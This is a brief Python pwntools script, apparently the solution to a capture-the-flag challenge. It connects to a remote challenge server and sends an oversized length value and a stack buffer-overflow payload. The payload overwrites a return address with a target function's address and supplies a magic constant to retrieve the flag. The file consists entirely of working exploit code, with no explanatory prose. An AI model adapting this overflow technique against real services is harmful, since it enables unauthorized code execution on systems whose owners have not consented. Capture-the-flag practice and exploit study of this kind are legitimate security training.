import pwn

# pwn.context.log_level = 'debug'

# io = pwn.process("./server")
io = pwn.remote("isc2024.1337.cx", 10082)

#* rbuf Stack[-0x5b] -> 87 (payload) + 4 return
rbuf_len = b"\x67\xff\xff\xff"  #! 103
io.send(rbuf_len)

#* db_first_flag address: 080497F8
#* magic value: 31337F64
payload = b"L" * 91 + b"\xf8\x97\x04\x08" + 4 * b"L" + b"\x64\x7f\x33\x31"
io.send(payload)

#* return to get flag
io.send(int(0).to_bytes(4, byteorder='little'))

print(io.recvline())

io.recv()